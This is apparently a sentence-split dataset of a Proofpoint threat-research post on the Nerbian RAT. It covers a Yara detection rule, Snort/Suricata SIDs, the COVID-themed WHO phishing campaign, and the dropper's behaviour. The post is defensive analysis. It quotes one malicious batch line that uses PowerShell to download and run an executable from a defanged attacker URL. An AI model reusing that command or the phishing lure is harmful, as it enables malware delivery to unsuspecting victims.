{"id": "sentence_0x4ef98f35", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb4b8b24c", "chapter_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques", "text": "May 11, 2022 Andrew Northern, Pim Trouerbach, Tony Robinson, Axel F"}
{"id": "sentence_0x65727b2e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Network"}
{"id": "sentence_0x4df619af", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Snort and Suricata rules are available in the ETOPEN ruleset under SIDs: 2036426 - ET MALWARE Nerbian RAT CnC Checkin 2036427 - ET MALWARE Nerbian RAT Data Exfiltration"}
{"id": "sentence_0x35587f34", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Static"}
{"id": "sentence_0xf8a0924d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "The Yara rule below should provide host-based static detection of the RAT payload:"}
{"id": "sentence_0x2c5d0029", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "rule Nerbian_RAT"}
{"id": "sentence_0x6d08b700", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "{"}
{"id": "sentence_0xe0179829", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "meta:"}
{"id": "sentence_0x76dc120f", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "author = \"ptrouerbach\""}
{"id": "sentence_0x167b2874", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "reference = \"5e6c5a9fda2d20125f6f24e37e8a217a39ff0a5cfddc07ddfdb18049d9ea4597\""}
{"id": "sentence_0x10c5b979", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "malfamily = \"NerbianRAT\""}
{"id": "sentence_0x44885f9a", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "strings:"}
{"id": "sentence_0x2d8d7277", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$args_p = \"p-\" ascii"}
{"id": "sentence_0x1e2ed2d2", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$args_s = \"s-\" ascii"}
{"id": "sentence_0x90fe4793", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$args_h = \"h-\" ascii"}
{"id": "sentence_0x1275be6d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$args_P = \"P-\" ascii"}
{"id": "sentence_0x7ec5a7f0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$hardcoded_aes_key = { 17E87F581F1DF8D6129D65FD50CEB3DD6C4E1C223077CD7D4C595DA6C3DF92B2 }"}
{"id": "sentence_0x7c647009", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$param_auth = \"auth_post\" ascii"}
{"id": "sentence_0x5556fc7c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$param_session = \"session_key\" ascii"}
{"id": "sentence_0xe21285a8", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$param_data = \"data_post\" ascii"}
{"id": "sentence_0x9e95571b", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$param_addr = \"addr_post\" ascii"}
{"id": "sentence_0x47bc3168", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "$param_port = \"port_post\" ascii"}
{"id": "sentence_0xd67c9bd8", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "condition:"}
{"id": "sentence_0xfd2c43b0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "uint16be(0) == 0x4D5A"}
{"id": "sentence_0x207f54d0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "and ($hardcoded_aes_key or (all of ($param*) and all of ($args*)))"}
{"id": "sentence_0xf923714a", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "and filesize < 10MB"}
{"id": "sentence_0xf3baedd1", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "}"}
{"id": "sentence_0xf15f6c2e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Additional Acknowledgements"}
{"id": "sentence_0x701a4120", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Proofpoint security researchers would like to thank security researcher pr0xylife sharing his observations of this threat on social media."}
{"id": "sentence_0xf115c4cc", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Previous Blog Post"}
{"id": "sentence_0xfc67491c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "Subscribe to the Proofpoint Blog"}
{"id": "sentence_0xfd8a8c63", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x91e0d861", "chapter_title": "Detection", "text": "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"}
{"id": "sentence_0x9b5a36bd", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfaac677f", "chapter_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques", "text": "Blog"}
{"id": "sentence_0xa1155b41", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfaac677f", "chapter_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques", "text": "Threat Insight"}
{"id": "sentence_0xd9800e2b", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfaac677f", "chapter_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques", "text": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques"}
{"id": "sentence_0xdddb5690", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x2af7bf97", "chapter_title": "Key Findings", "text": "Proofpoint has analyzed a novel malware variant which utilizes significant anti-analysis and anti-reversing capabilities. The malware, written in the Go programming language, uses multiple open-source Go libraries for conducting malicious activities. The malware, called Nerbian remote access trojan (RAT) leverages COVID-19 and World Health Organization themes to spread. Proofpoint researchers named the malware based on a named function in the malware code. Nerbia is a fictional place from the novel Don Quixote."}
{"id": "sentence_0xdeac038c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xdd9d201e", "chapter_title": "Overview", "text": "The newly identified Nerbian RAT leverages multiple anti-analysis components spread across several stages, including multiple open-source libraries. It is written in operating system (OS) agnostic Go programming language, compiled for 64-bit systems, and leverages several encryption routines to further evade network analysis. Go is an increasingly popular language used by threat actors, likely due to its lower barrier to entry and ease of use."}
{"id": "sentence_0x226b0fa6", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Starting on April 26, 2022, Proofpoint researchers observed a low volume (less than 100 messages) email-borne malware campaign sent to multiple industries. The threat disproportionately impacts entities in Italy, Spain, and the United Kingdom. The emails claimed to be representing the World Health Organization (WHO) with important information regarding COVID-19. The malware sample was also noted by security researcher pr0xylife on Twitter. Proofpoint researchers observed the following indicators and attachments:"}
{"id": "sentence_0x2bd9e3f8", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "From: who.inter.svc@gmail[.]com, announce@who-international[.]com"}
{"id": "sentence_0x133184fd", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Subjects: WHO, World Health Organization"}
{"id": "sentence_0xeddab618", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Attachment Names and Types: who_covid19.rar with who_covid19.doc inside, covid19guide.rar with covid19guide.doc inside, covid-19.doc"}
{"id": "sentence_0x5fee8083", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "The messages that purport to be from WHO and include safety measures relating to COVID-19 include an attached Word document containing macros."}
{"id": "sentence_0xa37cad7e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Figure 1: Example email that purports to be from WHO."}
{"id": "sentence_0x75f16ed4", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Figure 2: Attached Word document."}
{"id": "sentence_0x31d64729", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "The emails contain a macro-laden Word attachment (sometimes compressed with RAR). When macros are enabled, the document reveals information relating to COVID-19 safety, specifically about self-isolation and caring for individuals with COVID-19. Interestingly, the lure is similar to themes used in the early days of the pandemic in 2020, specifically spoofing the WHO to distribute information about the virus."}
{"id": "sentence_0x33d0bd37", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Figure 3: Screenshot of the document lure containing COVID-19 guidance, specifically what users see when they enable macros on the malicious document."}
{"id": "sentence_0xa06fb18", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "In addition to masquerading as the WHO, the document also appears to contain logos from the Health Service Executive (HSE), Government of Ireland, and National Council for the Blind of Ireland (NCBI)."}
{"id": "sentence_0x3f077a1b", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xb204983b", "chapter_title": "Campaign Details", "text": "Figure 4: Document with additional logos related to government and non-profit entities."}
{"id": "sentence_0x9ed0eac0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xcc5292ed", "chapter_title": "Attack Path", "text": "When users enable macros on this document, the document executes an embedded macro that drops a .bat file with the following contents:"}
{"id": "sentence_0x2ab65c2d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xcc5292ed", "chapter_title": "Attack Path", "text": "powershell IWR -Uri hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog -OutFile C:\\Users\\[username]\\AppData\\Roaming\\UpdateUAV.exe ;C:\\Users\\[username]\\AppData\\Roaming\\UpdateUAV.exe"}
{"id": "sentence_0xeaf05671", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xcc5292ed", "chapter_title": "Attack Path", "text": "This batch file performs a PowerShell Invoke Web Request (IWR) to the URL:"}
{"id": "sentence_0x4dcf5d14", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xcc5292ed", "chapter_title": "Attack Path", "text": "hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog,"}
{"id": "sentence_0x45d8421d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xcc5292ed", "chapter_title": "Attack Path", "text": "It renames the downloaded file to UpdateUAV.exe, and drops it into:"}
{"id": "sentence_0x18b1bbc9", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xcc5292ed", "chapter_title": "Attack Path", "text": "C:\\Users\\[current user]\\AppData\\Roaming\\UpdateUAV.exe."}
{"id": "sentence_0x8e041df6", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xabe72a86", "chapter_title": "Dropper: UpdateUAV.exe", "text": "UpdateUAV.exe is the payload initially downloaded from the malicious Word document. It is a 64-bit executable, written in Golang, 3.5MB in size, and UPX packed. Executable files created in the Go language tend to be slightly larger than most other executable files. Likely, this malware is packed with UPX to reduce the overall size of the executable being downloaded. Unpacked, the file is 6.6MB in total."}
{"id": "sentence_0xd8a325e7", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xabe72a86", "chapter_title": "Dropper: UpdateUAV.exe", "text": "Figure 5: The UpdateUAV.exe payload is packed with UPX, likely in an effort to reduce its size."}
{"id": "sentence_0x21a7af07", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xabe72a86", "chapter_title": "Dropper: UpdateUAV.exe", "text": "Proofpoint analysts extracted decrypted data during execution. The resulting memory revealed additional information about the sample."}
{"id": "sentence_0x867998e4", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x7ff48bac", "chapter_title": "Functionality", "text": "UpdateUAV.exe is a dropper for Nerbian RAT. This determination was made through multiple different observations. First is the string embedded in the sample:"}
{"id": "sentence_0x71dd5f61", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x7ff48bac", "chapter_title": "Functionality", "text": "K:/W_Work/Golang/src/RAT_Dropper/main_gen.go"}
{"id": "sentence_0x7c2aa733", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x7ff48bac", "chapter_title": "Functionality", "text": "According to the source path, this executable is a dropper. Proofpoint named this malware Nerbian RAT based on one of the function names in the dropper. The specific function name is main_downloadNerbian as shown in the following figure."}
{"id": "sentence_0x9f0c60d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x7ff48bac", "chapter_title": "Functionality", "text": "Figure 6 : Nerbian RAT main function code."}
